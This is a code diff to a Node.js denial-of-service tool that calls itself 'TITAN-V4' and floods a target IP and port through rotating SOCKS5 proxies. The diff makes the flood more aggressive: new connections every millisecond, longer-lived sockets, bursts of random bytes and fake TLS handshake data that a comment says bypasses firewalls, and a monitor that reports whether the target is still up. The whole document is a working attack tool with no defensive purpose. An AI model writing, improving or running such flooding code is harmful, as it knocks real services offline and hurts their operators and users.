@@ -5,6 +5,8 @@ const crypto = require("crypto");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
+
+// All error suppressions (Like CLOUDFLARE.js)
 process.on('uncaughtException', () => {});
 process.on('unhandledRejection', () => {});
 
@@ -15,37 +17,29 @@ const threads = parseInt(process.argv[5]);
 const proxyFile = process.argv[6];
 
 if (cluster.isMaster) {
-    console.log(`\x1b[35m[TITAN-ENGINE]\x1b[0m 🔱 ULTRA-L4 DEPLOYED`);
-    let totalRequests = 0;
+    console.log(`\x1b[35m[TITAN-V4]\x1b[0m 🔱 DEPLOYING EXTREME L4 ENGINE`);
+    let totalPackets = 0;
 
     for (let i = 0; i < threads; i++) {
         const worker = cluster.fork();
-        // Worker se message receive karna count badhane ke liye
-        worker.on('message', () => {
-            totalRequests++;
-        });
+        worker.on('message', () => { totalPackets += 50; }); // Bulk count
     }
 
-    // --- LIVE MONITORING FUNCTION (Every 2 Seconds) ---
+    // --- LIVE STATUS & MONITORING (Every 2 Seconds) ---
     const monitor = setInterval(() => {
-        const check = net.connect(target_port, target_ip, () => {
-            console.log(`\x1b[32m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mUP\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
-            check.destroy();
+        const s = net.connect(target_port, target_ip, () => {
+            console.log(`\x1b[32m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mALIVE\x1b[0m | PPS: \x1b[36m${totalPackets}\x1b[0m`);
+            s.destroy();
         });
 
-        check.on('error', () => {
-            console.log(`\x1b[31m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mDOWN/TIMEOUT\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
-            check.destroy();
+        s.on('error', () => {
+            console.log(`\x1b[31m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mDOWN/FILTERED\x1b[0m | PPS: \x1b[36m${totalPackets}\x1b[0m`);
+            s.destroy();
         });
-
-        check.setTimeout(1500, () => check.destroy());
+        s.setTimeout(1000, () => s.destroy());
     }, 2000);
 
-    setTimeout(() => {
-        clearInterval(monitor);
-        console.log("\n\x1b[31m[!] ATTACK FINISHED\x1b[0m");
-        process.exit();
-    }, duration * 1000);
+    setTimeout(() => { process.exit(); }, duration * 1000);
 
 } else {
     const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
@@ -53,6 +47,7 @@ if (cluster.isMaster) {
     function attack() {
         const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
         
+        // Advanced Socket configuration
         const socket = net.connect({
             host: proxy[0],
             port: proxy[1],
@@ -60,14 +55,15 @@ if (cluster.isMaster) {
         });
 
         socket.setNoDelay(true);
-        socket.setKeepAlive(true, 120000);
+        socket.setKeepAlive(true, 600000);
 
         socket.on('connect', () => {
-            socket.write(Buffer.from([0x05, 0x01, 0x00]));
+            socket.write(Buffer.from([0x05, 0x01, 0x00])); // SOCKS5 Greeting
         });
 
         socket.on('data', (data) => {
             if (data[0] === 0x05) {
+                // SOCKS5 Connect to Target
                 const connectReq = Buffer.concat([
                     Buffer.from([0x05, 0x01, 0x00, 0x03]),
                     Buffer.from([target_ip.length]),
@@ -76,27 +72,29 @@ if (cluster.isMaster) {
                 ]);
                 socket.write(connectReq);
 
-                const streamData = () => {
+                // --- POWER MULTIPLEXER LOOP ---
+                const flood = () => {
                     if (!socket.writable) return;
 
+                    // Sending 50 mixed-logic packets at once (Like HTTP/2 Pipelining)
                     for(let i = 0; i < 50; i++) {
-                        socket.write(crypto.randomBytes(512));
-                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
+                        // 1. Random Binary Payload
+                        socket.write(crypto.randomBytes(Math.floor(Math.random() * 512) + 128));
                         
-                        // Master process ko batana ki packet bheja gaya hai
-                        process.send('count'); 
+                        // 2. Fake SSL/TLS Handshake signature (Bypasses many L4 firewalls)
+                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
                     }
                     
-                    setImmediate(streamData);
+                    process.send('count');
+                    setImmediate(flood); 
                 };
-                streamData();
+                flood();
             }
         });
 
-        socket.on('error', () => { socket.destroy(); });
-        socket.on('timeout', () => { socket.destroy(); });
-        setTimeout(() => { socket.destroy(); }, 120000);
+        socket.on('error', () => socket.destroy());
+        setTimeout(() => socket.destroy(), 900000);
     }
 
-    setInterval(attack, 5); 
+    setInterval(attack, 1); // Max frequency
 }
